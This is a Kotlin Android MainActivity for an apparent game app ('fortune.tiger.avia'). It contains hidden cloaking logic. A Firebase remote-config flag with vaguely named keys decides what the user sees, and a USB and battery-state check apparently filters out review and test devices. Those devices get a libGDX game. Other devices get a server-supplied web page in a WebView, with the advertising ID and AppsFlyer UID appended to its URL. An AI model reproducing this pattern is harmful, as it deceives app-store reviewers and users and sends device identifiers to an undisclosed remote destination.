package fortune.tiger.avia

import android.content.pm.ActivityInfo
import android.os.Bundle
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.appsflyer.AppsFlyerLib
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.FirebaseApp
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import fortune.tiger.avia.databinding.ActivityMainBinding
import fortune.tiger.avia.util.AppsflyerUtil
import fortune.tiger.avia.util.DataStoreManager
import fortune.tiger.avia.util.Lottie
import fortune.tiger.avia.util.Once
import fortune.tiger.avia.util.getBatteryPercentage
import fortune.tiger.avia.util.internetConnection
import fortune.tiger.avia.util.isBatteryCharging
import fortune.tiger.avia.util.isUSB
import fortune.tiger.avia.util.log
import fortune.tiger.avia.wdc.WdcFragment
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val Wdc = 146
        var URL_Wdc = ""

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WdcFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            checkDataStore()
//            startFragmentID.tryEmit(R.id.libGDXFragment)
//            startFragmentID.tryEmit(INTERPOL)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_PORTRAIT
                        }
                        Wdc                 -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

//    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
//        super.onActivityResult(requestCode, resultCode, data)
//        webViewFragment.onActivityResult(requestCode, resultCode, data)
//    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie        = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.wdc)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(3_000)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Wdc" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        URL_Wdc = it
                        startFragmentID.emit(Wdc)
                    }
                }
                "Igrula" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getServerData()
                }
            }
        }
    }

    private fun getServerData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = getString("Multin")
                        log("success = $jsonData")
                        JSONObject(jsonData).also { jsonObj ->
                            val through = jsonObj.getString("through")
                            val blood = jsonObj.getString("blood")

                            lookParamsFor(through, blood)
                        }
                    } else {
                        startFragmentID.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION try catch = ${e.message}")
                }
            }
        }
    }

    private fun lookParamsFor(through: String, blood: String) {
        if (through=="true") {
            if (isUSB() || (getBatteryPercentage() == 100 && isBatteryCharging())) {
                openGamerZoom()
            } else {
                openWerba(blood)
            }
        } else {
            openGamerZoom()
        }
    }

    private fun openGamerZoom() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Igrula" }
            startFragmentID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun openWerba(be: String) {
        coroutine.launch(Dispatchers.IO) {
            AppsflyerUtil.initialize(this@MainActivity)
            val completer = CompletableDeferred<Unit>()

            launch {
                AppsflyerUtil.campaignFlow.collect {
                    log("campaignFlow = $it")
                    if (it != AppsflyerUtil.CAMPAIGN_INIT_VALUE) completer.complete(Unit)
                }
            }
            completer.await()

            val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id
            val appsflyerUID = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

            URL_Wdc = be + "?" +
                "adering=${advertisingId}&" +
                "flyCanSee=${appsflyerUID}&" +
                "compere=${AppsflyerUtil.campaignFlow.value}"

            log("WDC_URL: $URL_Wdc")

            DataStoreManager.Key.update { "Wdc" }
            DataStoreManager.Link.update { URL_Wdc }
            startFragmentID.tryEmit(Wdc)
        }
    }

}